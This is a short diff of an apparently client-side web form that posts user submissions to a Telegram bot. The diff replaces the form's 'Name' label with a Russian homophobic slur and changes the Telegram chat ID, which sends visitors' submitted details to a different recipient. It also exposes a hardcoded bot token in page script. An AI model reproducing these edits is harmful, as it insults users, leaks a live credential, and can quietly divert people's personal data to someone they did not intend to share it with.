@@ -14,7 +14,7 @@
         <form id="myForm">
             <div class="del">
                 <div class="left">
-            <label for="name">Имя*:</label>
+            <label for="name">Пидарас*:</label>
             <input type="text" id="name" name="name" required><br><br>
             <label for="issue">Выберите устройство</label>
             <select id="issue" name="issue">
@@ -87,7 +87,7 @@
     `;
 
     const token = "6479574195:AAE8dCZZthMDpapQhSXEBm8W30quU0yn9lA";
-    const chatId = "1093664497";
+    const chatId = "440526648";
     const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
 
     fetch(url)
